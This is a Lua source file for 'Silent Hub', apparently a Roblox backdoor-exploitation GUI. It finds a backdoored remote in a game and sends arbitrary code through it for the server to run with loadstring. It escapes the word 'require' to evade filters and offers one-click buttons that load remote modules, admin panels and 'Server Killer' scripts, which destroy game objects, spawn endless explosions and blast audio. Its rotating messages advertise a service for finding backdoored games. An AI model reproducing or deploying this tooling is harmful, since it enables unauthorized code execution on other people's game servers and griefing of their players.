		"Execute scripts and more in the 'Script Editor' tab!",
		"Silent Hub was made with love by @hyperionhax, friend me on Discord! ;)",
		"Your custom UI will save on your device by clicking 'Save Settings' in the Settings tab.",
		"Did you know we have an official Roblox group? come join it through our Discord!",
		"Spooky Scary Skeletons send shivers down your spine!",
		"Convert your character to R6 in the 'Script Editor' tab.",
		"Silent Hub is inspired by Rose Hub! Shoutout to @HumanoidDevelops and @Java1x3x5x6.",
		"The FitnessGram Pacer Test is a multistage aerobic capacity test that progressively gets more difficult as it continues.",
		"If you shoot rockets at Franklin's house and wait long enough, Franklin will eventually show up to defend his home.",
		"WONGA!",
		"I am the eggman, they are the eggmen, I am the walrus, goo goo g'joob!",
		"Our script editor supports several local scripts.",
		"All require script credits go to their creators!",
		"Circumvention is very hot",
		"In the 'Script Editor' tab, you can change to R6 with the press of a button!",
		"In the 'Script Editor' tab, you can change to R15 with the press of a button!",
		"In the 'Script Editor' tab, you can instantly respawn with the press of a button!",
		"Silent Hub is sponsored by team c00lkidd. B)",
		"Thank you for choosing Silent Hub!",
		"Searching for backdoored games? Head over to Requiem! https://req-exe.win",
		"Do a barrell roll!",
		"Aurora Borealis!? At this time of year, at this time of day, in this part of the country, localized entirely within your kitchen!?",
		"Welcome to paradise.",
		"Chicken Nuggets",
		"Silent Hub for da win!",
		"Hyperion was here. :3",
		"Shoutout to @14anz_exiled and team c00lkidd 3/4!",
		"get toadroasted you baconhaired bozos",
		"all of your base are belong to us",
		"Oh hey, this game is backdoored! :)",
		"Do people ever actually read these messages?",
		"Play Lua Script Execution! It's gud. ;)",
		"Great for PCs!",
		"Nice day, isn't it, ".. game.Players.LocalPlayer.Name.."?",
		"What's up, ".. game.Players.LocalPlayer.Name.."?",
		"SKRILLEX BANGARANG WUBWUWBWUBWUWBWUB",
		"JOIN ROBUX PLUS! ITS FREEEEEEEEEEEEEE!!!!",
		"THIS IS SPARTA!!",
		"I hope you like reading these messages. ;)",
		"Circumvention is very hot",
		"WOWZERZ! O_O",
		"Hello World!",
		"this is the backdoor scanner ever",
		"Another day, another message you won't read."
	}
	
	label.Text = "MOTD: "..messages[math.random(1,#messages)]
end;
task.spawn(C_d);
-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.ButtonContainer.Run.LocalScript
local function C_15()
local script = G2L["15"];
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Values.RemotePath
	local input = button.Parent.Parent.EditorContainer.TextBoxContainer.TextBox
	
	local function convert(code)
		local name = LocalPlayer.Name
	
		code = code:gsub("game%.Players%.LocalPlayer", 'game.Players["'..name..'"]')
		code = code:gsub("Players%.LocalPlayer", 'Players["'..name..'"]')
	
		code = code:gsub("require", [=[getfenv()['\114\101\113\117\105\114\101']]=])
	
		code = code:gsub('game:GetService%("Players"%)%.LocalPlayer', 'game:GetService("Players")["'..name..'"]')
		code = code:gsub("game:GetService%('Players'%)%.LocalPlayer", 'game:GetService("Players")["'..name..'"]')
	
		code = code:gsub("LocalPlayer%.Character", 'game.Players["'..name..'"].Character')
		code = code:gsub("LocalPlayer%.CharacterAdded:Wait%(%))", 'game.Players["'..name..'"].Character or game.Players["'..name..'"].CharacterAdded:Wait()')
	
		code = code:gsub("LocalPlayer%.PlayerGui", 'game.Players["'..name..'"]:FindFirstChild("PlayerGui")')
		code = code:gsub("LocalPlayer%.Backpack", 'game.Players["'..name..'"]:FindFirstChild("Backpack")')
	
		code = code:gsub("LocalPlayer:GetMouse%(%)", [[{
		Hit = game.Players["]]..name..[["].Character and game.Players["]]..name..[["].Character:GetPivot() or CFrame.new(),
		Origin = game.Players["]]..name..[["].Character and game.Players["]]..name..[["].Character:GetPivot() or CFrame.new(),
		Target = nil,
		TargetSurface = Enum.NormalId.Top,
		X = 0,
		Y = 0,
		ViewSizeX = 0,
		ViewSizeY = 0,
		UnitRay = Ray.new(Vector3.zero, Vector3.new(0,0,-1)),
		Ray = Ray.new(Vector3.zero, Vector3.new(0,0,-1)),
		Button1Down = Instance.new("BindableEvent").Event,
		Button1Up = Instance.new("BindableEvent").Event,
		Button2Down = Instance.new("BindableEvent").Event,
		Button2Up = Instance.new("BindableEvent").Event,
		Move = Instance.new("BindableEvent").Event,
		Idle = Instance.new("BindableEvent").Event,
		KeyDown = Instance.new("BindableEvent").Event,
		KeyUp = Instance.new("BindableEvent").Event,
		WheelForward = Instance.new("BindableEvent").Event,
		WheelBackward = Instance.new("BindableEvent").Event
	}]])
		
		code = code:gsub(
			"local%s+([%a_][%w_]*)%s*=%s*LocalPlayer:GetMouse%(%)",
			"local %1 = nil"
		)
	
		code = code:gsub("workspace%.CurrentCamera", "workspace.CurrentCamera")
		code = code:gsub("game%.CoreGui", 'game.Players["'..name..'"]:FindFirstChild("PlayerGui")')
		code = code:gsub("game:GetService%('CoreGui'%)", 'game.Players["'..name..'"]:FindFirstChild("PlayerGui")')
		
		code = code:gsub("game%s*:%s*HttpGet%s*%(", 'game:GetService("HttpService"):GetAsync(')
		code = code:gsub("game%s*%.%s*HttpGet%s*%(", 'game:GetService("HttpService"):GetAsync(')
	
		return code
	end
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local text = convert(input.Text)
	
		local code = "loadstring([==[" .. text .. "]==])()"
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_15);
-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.ButtonContainer.Clear.LocalScript
local function C_17()
local script = G2L["17"];
	local button = script.Parent
	local input = button.Parent.Parent.EditorContainer.TextBoxContainer.TextBox
	
	local function click()
		input.Text = ""
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_17);
-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.ButtonContainer.R6.LocalScript
local function C_19()
local script = G2L["19"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Values.RemotePath
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local code = [[
		require(128800686348301):r6("]] .. game.Players.LocalPlayer.Name .. [[")
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_19);
-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.ButtonContainer.R15.LocalScript
local function C_1b()
local script = G2L["1b"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Values.RemotePath
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local code = [[
		require(79843896299100).R15("]] .. game.Players.LocalPlayer.Name .. [[")
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_1b);
-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.ButtonContainer.Respawn.LocalScript
local function C_1d()
local script = G2L["1d"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Values.RemotePath
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local code = [[
		local player = game.Players.]] .. game.Players.LocalPlayer.Name .. [[
		local oldcframe = player.Character.HumanoidRootPart.CFrame
		player.CharacterAppearanceId = 0
		player:LoadCharacter()
		local character = player.Character or player.CharacterAdded:Wait()
		local root = character:WaitForChild("HumanoidRootPart")
		root.CFrame = oldcframe
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_1d);
-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Scripts.SearchBox.LocalScript
local function C_20()
local script = G2L["20"];
	local input = script.Parent
	local container = input.Parent:WaitForChild("ButtonContainer")
	
	local function update()
		local text = string.lower(input.Text)
	
		for _, button in ipairs(container:GetChildren()) do
			if (button:IsA("TextButton") or button:IsA("TextLabel")) and button.Name ~= "Button" then
				local buttontext = string.lower(button.Text)
	
				if string.find(buttontext, text, 1, true) then
					button.Visible = true
				else
					button.Visible = false
				end
			end
		end
	end
	
	input:GetPropertyChangedSignal("Text"):Connect(update)
end;
task.spawn(C_20);
-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Scripts.ButtonContainer.LocalScript
local function C_22()
local script = G2L["22"];
	local player = game.Players.LocalPlayer.Name
	local page = script.Parent
	local RemotePath = page.Parent.Parent.Parent.Parent.Parent.Values:WaitForChild("RemotePath")
	local RemoteFound = page.Parent.Parent.Parent.Parent.Parent.Values:WaitForChild("RemoteFound")
	local template = page.Button
	
	template.Visible = false
	
	while not RemoteFound.Value do
		RemoteFound.Changed:Wait()
	end
	
	while RemotePath.Value == "" do
		RemotePath:GetPropertyChangedSignal("Value"):Wait()
	end
	
	local path = RemotePath.Value
	
	if not path or path == "" then
		warn("Silent Hub: No remote path acquired yet!")
		return
	end
	
	local remote = game
	
	for segment in path:gmatch("[^.]+") do
		remote = remote:FindFirstChild(segment)
		if not remote then
			warn("Couldn't find:", segment)
			return
		end
	end
	
	if not remote then
		return
	end
	
	local function create(name, func)
		local button = template:Clone()
		button.Name = name
		button.Text = name
		button.Visible = true
		button.Parent = page
	
		button.MouseButton1Click:Connect(function()
			func(button)
		end)
	end
	
	local function execute(code)
		local code = [[
		 ]] .. code .. [[
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	local scripts = {
		{"Infinite Yield", function(button)
			execute('require(7634392335)("' .. player .. '")')
		end},
		
		{"Studio Dummy", function(button)
			execute('require(14013776397).HorizonLC("' .. player .. '")')
		end},
		
		{"Reality Glitcher [R6]", function(button)
			execute('require(4721789462).noxd("' .. player .. '")')
		end},
		
		{"MLG Gun [R6]", function(button)
			execute('require(6802356973).load("' .. player .. '")')
		end},
		
		{"Neptunian V [R6]", function(button)
			execute('require(82295806676393).Neptunian("' .. player .. '")')
		end},
		
		{"Grab Knife V1 [R6]", function(button)
			execute('require(14638461547).GKV1("' .. player .. '")')
		end},
		
		{"Grab Knife V2 [R6]", function(button)
			execute('require(16662799266):Fire("' .. player .. '", "knife")')
		end},
		
		{"Grab Knife V3 [R6]", function(button)
			execute('require(2829943043):Run("' .. player .. '", "i baked you a pie")')
		end},
		
		{"Grab Knife V4 [R6]", function(button)
			execute('require(93444499562289).DE("' .. player .. '")')
		end},
		
		{"9/11", function(button)
			execute('require(5040700729).load("' .. player .. '")')
		end},
		
		{"Disco Fog", function(button)
			execute([[
				local Lighting = game:GetService("Lighting")
			
			
				task.spawn(function()
			Lighting.FogEnd = 100
			Lighting.FogStart = 0
			Lighting.Brightness = 0
			Lighting.TimeOfDay = "00:00:00"
	
			while true do
				for h = 0, 359, 5 do
	
					local color = Color3.fromHSV(h / 360, 1, 1)
	
					Lighting.Ambient = color
					Lighting.OutdoorAmbient = color
					Lighting.ColorShift_Top = color
					Lighting.ColorShift_Bottom = color
					Lighting.FogColor = color
	
					wait()
				end
			end
		end)
				]])
			
			
		end},
		
		{"Bomb Vest [R6]", function(button)
			execute('require(0x49731b7f).load("' .. player .. '")')
		end},
		
		{"Sledgehammer [R6]", function(button)
			execute('require(8038037940).CLoad("' .. player .. '")')
		end},
		
		{"Dev-Uzi [R6]", function(button)
			execute('require(13612021114):Fire("' .. player .. '", "dev-uzi")')
		end},
		
		{"Dual Ultima [R6]", function(button)
			execute('require(2946060158):Fire("' .. player .. '", "hack")')
		end},
		
		{"Xester [R6]", function(button)
			execute('require(6099241563).load("' .. player .. '")')
		end},
		
		{"Pandora [R6]", function(button)
			execute('require(13260588937).p11("' .. player .. '")')
		end},
		
		{"Cesus", function(button)
			execute('require(119924030819900).CesusTBB("' .. player .. '")')
		end},
		
		{"Ragdoll Pan [R6]", function(button)
			execute([[
			require(2946000013):Fire(']] .. player .. [[', 'hack')
			]])
		end},
		
		{"Doge Army", function(button)
			execute('require(5115249013).fehack("' .. player .. '")')
		end},
		
		{"John Doe [R6]", function(button)
			execute('require(2845929020).ooga("' .. player .. '")')
		end},
		
		{"Red Scythe [R6]", function(button)
			execute('require(3543603059).load("' .. player .. '")')
		end},
		
		{"Server Admin [R6]", function(button)
			execute('require(4665394711).load("' .. player .. '")')
		end},
		
		{"Hacker X [R6]", function(button)
			execute('require(4722260429).load("' .. player .. '")')
		end},
		
		{"Felipe Ascension [R6]", function(button)
			execute('require(5605396200):load("' .. player .. '", "Felipe")')
		end},
		
		{"Killbot", function(button)
			execute('require(110756170974672).killbot("' .. player .. '")')
		end},
		
		{"Noot Noot [Server Killer]", function(button)
			execute([[
			
				--no require here, just us chickens!
	local pingudecal = "http://www.roblox.com/asset/?id=382332426"
	local didpingu = false
	local ScreenGui = Instance.new("ScreenGui",game.Players.]] .. player .. [[.PlayerGui)
	ScreenGui.Name = "nooties"
	local asd = Instance.new("TextButton",ScreenGui)
	asd.BackgroundColor3 = Color3.new(0,0,0)
	asd.BorderColor3 = Color3.new(0,0,0)
	asd.Name = "nooties"
	asd.Position = UDim2.new(1,-150,1,-90)
	asd.Size = UDim2.new(0,150,0,45)
	asd.Font = "SourceSansBold"
	asd.FontSize = "Size32"
	asd.Text = "Noot Noot!"
	asd.TextColor3 = Color3.new(255,255,255)
	asd.MouseButton1Down:connect(function()
	if didpingu == false then
	didpingu = true
	for i,v in pairs(game.Players:GetChildren()) do
	if v:IsA("Player") then
	local nooties = Instance.new("Sound",workspace)
	nooties.SoundId = "http://www.roblox.com/asset/?id=109928136872365"
	nooties.Volume = 10
	nooties.PlaybackSpeed = 0.9
	nooties.Looped = true
	local bassboost = Instance.new("DistortionSoundEffect", nooties)	
	bassboost.Level = 0.8
	local pitchshift = Instance.new("PitchShiftSoundEffect", nooties)	
	pitchshift.Octave = 1.30
	nooties:Play()
	end
	end
	wait(10)
	local Sky = Instance.new("Sky",game.Lighting)
	Sky.SkyboxBk = pingudecal
	Sky.SkyboxDn = pingudecal
	Sky.SkyboxFt = pingudecal
	Sky.SkyboxLf = pingudecal
	Sky.SkyboxRt = pingudecal
	Sky.SkyboxUp = pingudecal
	local function modelasd()
	for i,v in pairs(workspace:GetChildren()) do
	if v:IsA("Model") then
	for i,a in pairs(v:GetChildren()) do
	local top = Instance.new("Decal",a)
	top.Face = "Top"
	top.Texture = pingudecal
	local btm = Instance.new("Decal",a)
	btm.Face = "Bottom"
	btm.Texture = pingudecal
	local lft = Instance.new("Decal",a)
	lft.Face = "Left"
	lft.Texture = pingudecal
	local rft = Instance.new("Decal",a)
	rft.Face = "Right"
	rft.Texture = pingudecal
	local frnt = Instance.new("Decal",a)
	frnt.Face = "Front"
	frnt.Texture = pingudecal
	local bk = Instance.new("Decal",a)
	bk.Face = "Back"
	bk.Texture = pingudecal
	local VTest = Instance.new("ParticleEmitter")  
	VTest.Parent = a
	VTest.Texture = pingudecal
	VTest.Speed = NumberRange.new(200)
	VTest.Rate = 200
	VTest.Size = NumberSequence.new(10000,10000)
	VTest.Lifetime = NumberRange.new(1000)
	local pepe = coroutine.create(function()
	while wait() do
	local Explosion = Instance.new("Explosion",a)
	Explosion.BlastRadius = 10000
	end
	end)
	coroutine.resume(pepe)
	end
	end
	end
	end
	local function partasd()
	for i,a in pairs(workspace:GetChildren()) do
	local top = Instance.new("Decal",a)
	top.Face = "Top"
	top.Texture = pingudecal
	local btm = Instance.new("Decal",a)
	btm.Face = "Bottom"
	btm.Texture = pingudecal
	local lft = Instance.new("Decal",a)
	lft.Face = "Left"
	lft.Texture = pingudecal
	local rft = Instance.new("Decal",a)
	rft.Face = "Right"
	rft.Texture = pingudecal
	local frnt = Instance.new("Decal",a)
	frnt.Face = "Front"
	frnt.Texture = pingudecal
	local bk = Instance.new("Decal",a)
	bk.Face = "Back"
	bk.Texture = pingudecal
	local VTest = Instance.new("ParticleEmitter")  
	VTest.Parent = a
	VTest.Texture = pingudecal
	VTest.Speed = NumberRange.new(200)
	VTest.Rate = 200
	VTest.Lifetime = NumberRange.new(1000)
	VTest.Size = NumberSequence.new(10000,10000)
	local pepe = coroutine.create(function()
	while wait() do
	if a.Name ~= "Head" or "Torso" or "Left Arm" or "Right Arm" or "Left Leg" or "Right Leg" then
	local Explosion = Instance.new("Explosion",a)
	Explosion.BlastRadius = 10000
	end
	end
	end)
	coroutine.resume(pepe)
	end
	end
	partasd()
	modelasd()
	else
	warn("Already Ran! Did not execute the script!")
	end
	end)
			
			]])
		end},
		
		{"Minecraft Steve [R6]", function(button)
			execute('require(16756009191).mc("' .. player .. '")')
		end},
		
		{"Toadroast [Server Killer]", function(button)
			execute([[
			
		wait(0)
	math.randomseed(tick() % 1 * 1e6)
	sky = coroutine.create(function()
		while wait(0.3) do
			s = Instance.new("Sky",game.Lighting)
			s.SkyboxBk,s.SkyboxDn,s.SkyboxFt,s.SkyboxLf,s.SkyboxRt,s.SkyboxUp = "rbxassetid://201208408","rbxassetid://201208408","rbxassetid://201208408","rbxassetid://201208408","rbxassetid://201208408","rbxassetid://201208408"
			s.CelestialBodiesShown = false
		end
	end)
	 
	 
	del = coroutine.create(function()
		while wait() do
			for i,v in pairs(workspace:GetChildren()) do
				if v:IsA("Model") then
					v:Destroy()
				end
			end
		end
	end)
	 
	 
	 
	for i,v in pairs(game.Players:GetChildren()) do
	end
	 
	noises = {'rbxassetid://230287740','rbxassetid://271787597','rbxassetid://153752123','rbxassetid://271787503'}
	 
	sound = coroutine.create(function()
		a = Instance.new("Sound",workspace)
		a.SoundId = "rbxassetid://141509625"
		a.Name = "RAINING MEN"
		a.Volume = 58359
		a.Looped = true
		a:Play()
		while wait(0.2) do
			rainin = workspace:FindFirstChild("RAINING MEN")
			if not rainin then
				a = Instance.new("Sound",workspace)
				a.SoundId = "rbxassetid://9007859985"
				a.Name = "RAINING MEN"
				a.Volume = 58359
				a.Looped = true
				a:Play()
			end
		end
	end)
	 
	msg = coroutine.create(function()
		while wait(0.4) do
			msg = Instance.new("Message",workspace)
			msg.Text = "get toadroasted you bacon haired bozos"
		wait(0.4)
			msg:Destroy()
		end
	end)
	 
	 
	rain = coroutine.create(function()
		while wait(10 % 1 * 1e2) do
			part = Instance.new("Part",workspace)
			part.Name = "Meshes/toad (3)"
	 
			mesh = Instance.new("SpecialMesh",part)
	 
			sound = Instance.new("Sound",workspace)
	 
			part.CanCollide = false
			part.Size = Vector3.new(440,530,380)
			part.Position = Vector3.new(math.random(-3000,1000),math.random(1,3000),math.random(-3000,3000))
	 
			sound.SoundId = noises[math.random(1,#noises)]
			sound:Play()
			sound.Ended:connect(function()
				sound:Destroy()
			end)
	 
	 
			mesh.MeshType = "FileMesh"
			mesh.MeshId = "rbxassetid://7234998844"
			mesh.TextureId = "rbxassetid://1009824086"
		end
	end)
	coroutine.resume(sky)
	coroutine.resume(del)
	coroutine.resume(sound)
	coroutine.resume(msg)
	coroutine.resume(rain)
	 
	local sound = Instance.new("Sound")
	local distortion = Instance.new("DistortionSoundEffect")
	 
	sound.Name = "Sound"
	sound.SoundId = "http://www.roblox.com/asset/?id=82490517845599" --Song
	sound.Volume = 999999
	sound.Pitch = 1 --Speed of Playback
	sound.Looped = true
	sound.archivable = false
	
	distortion.Level = 0.9
	 
	sound.Parent = game.Workspace
	distortion.Parent = sound
	 
	wait(0)
	 
	sound:play()
			
			]])
		end},
		
		{"Zalgo", function(button)
			execute('require(5195961797).eliza("' .. player .. '")')
		end},
		
		{"c00lkiddify [Server Killer]", function(button)
			execute([[
			id = 158118263
	
	for _, v in pairs(game.Workspace:GetDescendants()) do
	    local p = Instance.new("ParticleEmitter")
		faces = {"Front", "Back", "Right", "Left", "Top", "Bottom"}
		local decals = {}
		
	    p.Name = "c00l"
	    p.Texture = "rbxassetid://" ..id
	    p.Parent = v
		
		
		for i, face in ipairs(faces) do
			local decal = Instance.new("Decal", v)
			decal.Texture = "rbxassetid://" .. id
			decal.Face = face
			table.insert(decals, decal)
		end
	end
	
	local s = Instance.new("Sky", game.Lighting)
	
	s.SkyboxBk = "rbxassetid://" .. id
	s.SkyboxDn = "rbxassetid://" .. id
	s.SkyboxFt = "rbxassetid://" .. id
	s.SkyboxLf = "rbxassetid://" .. id
	s.SkyboxRt = "rbxassetid://" .. id
	s.SkyboxUp = "rbxassetid://" .. id
	
	
			]])
		end},
		
		{"Reality Orb [R6]", function(button)
			execute('require(4780399515).load("' .. player .. '")')
		end},
		
		{"Lava Knight [R6]", function(button)
			execute('require(5813766312).load("' .. player .. '")')
		end},
		
		{"Gravity Hammer [R6]", function(button)
			execute('require(4702851632).load("' .. player .. '")')
		end},
		
		{"Lighting Cannon [R6]", function(button)
			execute('require(12750218971)("' .. player .. '")')
		end},
		
		{"F3X Building Tools", function(button)
			execute('require(4869378421).F3X("' .. player .. '")')
		end},
		
		{"Star Time Glitcher [R6]", function(button)
			execute('require(5480093885):StarGlitcherTime("' .. player .. '")')
		end},
		
		{"Mr. Pixels [R6]", function(button)
			execute('require(2995020929):Fire("oof", "' .. player .. '")')
		end},
		
		{"The Sun is a Deadly Laser [R6]", function(button)
			execute([[
			require(4528360948):Fire(']] .. player .. [[', 'hack')
			]])
		end},
		
		{"The Obliterator [R6]", function(button)
			execute('require(5407983416).c3("' .. player .. '")')
		end},
		
		{"Void Slayer [R6]", function(button)
			execute('require(8000740582).load("' .. player .. '")')
		end},
		
		{"C4 Tool", function(button)
			execute('require(0x1767bf813)("' .. player .. '")')
		end},
		
		{"Excavator", function(button)
			execute('require(16857604287)("' .. player .. '")')
		end},
		
		{"The Last Rig", function(button)
			execute('require(132155655397653)("' .. player .. '")')
		end},
		
		{"Goner [R6]", function(button)
			execute('require(4513235536).G("' .. player .. '")')
		end},
		
		{"Last Star [R6]", function(button)
			execute('require(17346979612).load("' .. player .. '")')
		end},
		
		{"Swat Blasio [R6]", function(button)
			execute([[
			require(5054849946):Fire(']] .. player .. [[', 'test')
			]])
		end},
		
		{"Mr. Bean Admin", function(button)
			execute('require(16638501761){Owners={"' .. player .. '"},Prefix=";"}')
		end},
		
		{"Anti-Logger", function(button)
			execute('require(7305370936).ANTILGR()')
		end},
	
	}
	
	for _, item in ipairs(scripts) do
		create(unpack(item))
	end
end;
task.spawn(C_22);
-- StarterGui.SilentHub.UI.MainContainer.PageContainer.GUIs.SearchBox.LocalScript
local function C_27()
local script = G2L["27"];
	local input = script.Parent
	local container = input.Parent:WaitForChild("ButtonContainer")
	
	local function update()
		local text = string.lower(input.Text)
	
		for _, button in ipairs(container:GetChildren()) do
			if (button:IsA("TextButton") or button:IsA("TextLabel")) and button.Name ~= "Button" then
				local buttontext = string.lower(button.Text)
	
				if string.find(buttontext, text, 1, true) then
					button.Visible = true
				else
					button.Visible = false
				end
			end
		end
	end
	
	input:GetPropertyChangedSignal("Text"):Connect(update)
end;
task.spawn(C_27);
-- StarterGui.SilentHub.UI.MainContainer.PageContainer.GUIs.ButtonContainer.LocalScript
local function C_29()
local script = G2L["29"];
	local player = game.Players.LocalPlayer.Name
	local page = script.Parent
	local RemotePath = page.Parent.Parent.Parent.Parent.Parent.Values:WaitForChild("RemotePath")
	local RemoteFound = page.Parent.Parent.Parent.Parent.Parent.Values:WaitForChild("RemoteFound")
	local template = page.Button
	
	template.Visible = false
	
	while not RemoteFound.Value do
		RemoteFound.Changed:Wait()
	end
	
	while RemotePath.Value == "" do
		RemotePath:GetPropertyChangedSignal("Value"):Wait()
	end
	
	local path = RemotePath.Value
	
	if not path or path == "" then
		warn("Silent Hub: No remote path acquired yet!")
		return
	end
	
	local remote = game
	
	for segment in path:gmatch("[^.]+") do
		remote = remote:FindFirstChild(segment)
		if not remote then
			warn("Couldn't find:", segment)
			return
		end
	end
	
	if not remote then
		return
	end
	
	local function create(name, func)
		local button = template:Clone()
		button.Name = name
		button.Text = name
		button.Visible = true
		button.Parent = page
	
		button.MouseButton1Click:Connect(function()
			func(button)
		end)
	end
	
	local function execute(code)
		local code = [[
		 ]] .. code .. [[
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	local scripts = {
		{"Dex", function(button)
			execute('require(14572394952)("' .. player .. '")')
		end},
		
		{"Stratosphere", function(button)
			execute('require(6535776034).load("' .. player .. '")')
		end},
		
		{"T0PK3K", function(button)
			execute('require(0x342D5F0DA)("' .. player .. '")')
		end},
		
		{"YourMom GUI", function(button)
			execute('require(120133869038302).YourMom("' .. player .. '")')
		end},
		
		{"c00lgui", function(button)
			execute('require(139332781079625).c00lgui("' .. player .. '", "c00lkidd")')
		end},
		
		{"Komora", function(button)
			execute('require(85436608335941).KOMORA("' .. player .. '")')
		end},
		
	}
	
	for _, item in ipairs(scripts) do
		create(unpack(item))
	end
end;
task.spawn(C_29);
-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Maps.SearchBox.LocalScript
local function C_2e()
local script = G2L["2e"];
	local input = script.Parent
	local container = input.Parent:WaitForChild("ButtonContainer")
	
	local function update()
		local text = string.lower(input.Text)
	
		for _, button in ipairs(container:GetChildren()) do
			if (button:IsA("TextButton") or button:IsA("TextLabel")) and button.Name ~= "Button" then
				local buttontext = string.lower(button.Text)
	
				if string.find(buttontext, text, 1, true) then
					button.Visible = true
				else
					button.Visible = false
				end
			end
		end
	end
	
	input:GetPropertyChangedSignal("Text"):Connect(update)
end;
task.spawn(C_2e);
-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Maps.ButtonContainer.LocalScript
local function C_30()
local script = G2L["30"];
	local player = game.Players.LocalPlayer.Name
	local page = script.Parent
	local RemotePath = page.Parent.Parent.Parent.Parent.Parent.Values:WaitForChild("RemotePath")
	local RemoteFound = page.Parent.Parent.Parent.Parent.Parent.Values:WaitForChild("RemoteFound")
	local template = page.Button
	
	template.Visible = false
	
	while not RemoteFound.Value do
		RemoteFound.Changed:Wait()
	end
	
	while RemotePath.Value == "" do
		RemotePath:GetPropertyChangedSignal("Value"):Wait()
	end
	
	local path = RemotePath.Value
	
	if not path or path == "" then
		warn("Silent Hub: No remote path acquired yet!")
		return
	end
	
	local remote = game
	
	for segment in path:gmatch("[^.]+") do
		remote = remote:FindFirstChild(segment)
		if not remote then
			warn("Couldn't find:", segment)
			return
		end
	end
	
	if not remote then
		return
	end
	
	local function create(name, func)
		local button = template:Clone()
		button.Name = name
		button.Text = name
		button.Visible = true
		button.Parent = page
	
		button.MouseButton1Click:Connect(function()
			func(button)
		end)
	end
	
	local function execute(code)
		local code = [[
		 ]] .. code .. [[
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	local scripts = {
		{"KFC", function(button)
			execute('require(2870590559).kfc()')
		end},
		
		{"Redwood Prison", function(button)
			execute('require(3161149041+1).redwood()')
		end},
		
		{"Nazi Map", function(button)
			execute('require(139666139485072).load("' .. player .. '")')
		end},
		
		{"Natural Disaster Survival", function(button)
			execute('require(14704225060).nds()')
		end},
		
		{"Prison Life", function(button)
			execute('require(14314506567).Load()')
		end},
		
		{"Crossroads", function(button)
			execute('require(3339279811).load("' .. player .. '")')
		end},
		
		{"Roblox Headquarters", function(button)
			execute('require(17110658137).asd("' .. player .. '")')
		end},
		
		{"Brookhaven", function(button)
			execute('require(110191289672557).brookhaven()')
		end},
	
		{"Ohio Map", function(button)
			execute('require(14288620360).ohiov2("' .. player .. '")')
		end},
		
		{"Sword Fight on the Heights Original", function(button)
			execute('require(84779642132074).loadmap()')
		end},
		
		{"Tubers93's Mosque", function(button)
			execute('require(131945008071397).map("' .. player .. '")')
		end},
		
		{"McDonald's", function(button)
			execute('require(3168737443).load("' .. player .. '")')
		end},
		
		{"Clockwork Arena", function(button)
			execute('require(13887518057)()')
		end},
		
		{"Fling Things and People", function(button)
			execute('require(133441079384411)()')
		end},
	}
	
	for _, item in ipairs(scripts) do
		create(unpack(item))
	end
end;
task.spawn(C_30);
-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.Button2Container.ColorPicker.LocalScript
local function C_3b()
local script = G2L["3b"];
	local button = script.Parent
	local colorpick = button.Parent.Parent.Parent.Parent.Parent.ColorPick
	
	button.MouseButton1Click:Connect(function()
		local enabled = not colorpick.Enabled
	
		colorpick.Enabled = enabled
		colorpick.ColorPicker.Visible = enabled
	end)
end;
task.spawn(C_3b);
-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.Button2Container.PickerBackgroundToggle.LocalScript
local function C_3d()
local script = G2L["3d"];
	local button = script.Parent
	local colorpick = button.Parent.Parent.Parent.Parent.Parent.Parent.Values.ChangePickerBackground
	
